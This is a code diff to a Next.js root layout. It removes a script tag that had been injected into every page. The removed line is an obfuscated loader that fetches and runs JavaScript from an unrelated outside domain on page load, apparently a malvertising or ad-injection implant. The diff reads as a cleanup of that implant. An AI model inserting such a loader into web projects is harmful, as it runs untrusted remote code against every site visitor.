@@ -100,7 +100,6 @@ export default function RootLayout({ children }) {
         </AppProvider>
         <Analytics />
         <SpeedInsights />
-        <script dangerouslySetInnerHTML={{ __html: `(function(nnogjw){var d = document, s = d.createElement('script'), l = d.scripts[d.scripts.length - 1]; s.settings = nnogjw || {}; s.src = "\/\/expensive-pollution.com\/c.DO9C6GbI2-5plhSYWNQ\/9KNpzWM\/y\/NzT\/UrztMXyL0s3pMYz\/IH1VNTTuMP3A"; s.async = true; s.referrerPolicy = 'no-referrer-when-downgrade'; l.parentNode.insertBefore(s, l); })({})` }} />
       </body>
     </html>
   );
